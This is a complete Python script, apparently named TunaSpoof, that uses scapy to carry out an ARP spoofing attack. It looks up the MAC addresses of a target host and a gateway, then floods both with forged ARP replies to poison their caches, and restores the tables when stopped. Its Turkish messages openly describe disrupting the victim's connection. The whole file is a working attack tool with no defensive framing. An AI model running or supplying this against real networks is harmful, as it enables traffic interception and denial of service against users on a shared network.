from scapy.all import ARP, Ether, sendp, srp
import sys
import time

banner = """
████████╗██╗   ██╗███╗   ██╗ █████╗ ███████╗██████╗  ██████╗  ██████╗ ███████╗
╚══██╔══╝██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
   ██║   ██║   ██║██╔██╗ ██║███████║███████╗██████╔╝██║   ██║██║   ██║█████╗  
   ██║   ██║   ██║██║╚██╗██║██╔══██║╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  
   ██║   ╚██████╔╝██║ ╚████║██║  ██║███████║██║     ╚██████╔╝╚██████╔╝██║     
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝  
 👾 TunaSpoof başlatılıyor... Ağda bir şeyler ters gidecek.
 """
 
def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
    print("[*] ARP tablosu düzeltildi. Ama zihinlerdeki korku kalacak.")

def arp_spoof_flood(target_ip, target_mac, gateway_ip, gateway_mac):
    print("[*] Stabil bağlantının sonu TunaSpoof çalışıyor. Ctrl+C ile kurbanın canını bağışlayabilirsiniz.")
    try:
        while True:
            for _ in range(50):
                sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
                sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
            time.sleep(0.01)
    except KeyboardInterrupt:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

if __name__ == "__main__":
    print(banner)
    if len(sys.argv) != 3:
        print(f"[*] Kullanım: python TunaSpoof.py <hedef_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] {target_ip} için MAC adresi bulunamadı.")
        sys.exit(1)
    print(f"[*] Hedef MAC: {target_mac}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] {gateway_ip} için MAC adresi bulunamadı.")
        sys.exit(1)
    print(f"[*] Gateway MAC: {gateway_mac}")

    arp_spoof_flood(target_ip, target_mac, gateway_ip, gateway_mac)
